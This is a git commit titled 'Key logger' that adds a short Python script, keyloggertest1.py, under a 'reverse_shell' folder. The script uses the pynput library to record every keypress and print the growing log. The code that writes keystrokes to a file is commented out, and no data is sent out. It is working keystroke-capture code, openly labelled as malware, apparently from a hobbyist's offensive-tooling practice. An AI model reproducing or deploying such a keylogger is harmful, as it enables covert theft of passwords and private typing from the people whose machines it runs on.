7e44d5a78ef91c182cd20d724f2eedb7f872ffb3
qwe123kids <qwe123kids@gmail.com>
2023-03-25 20:07:14 -0600

    Key logger

---
+++ reverse_shell/keyloggertest1.py
@@ -0,0 +1,20 @@
+#!/usr/bin/python
+
+import pynput.keyboard
+
+log = ""
+def process_keys(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log +""
+    print(log)
+    #with open("log.txt","a") as fin:
+     #   fin.write(str(key))
+
+keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
+with keyboard_listener:
+    keyboard_listener.join()
+        
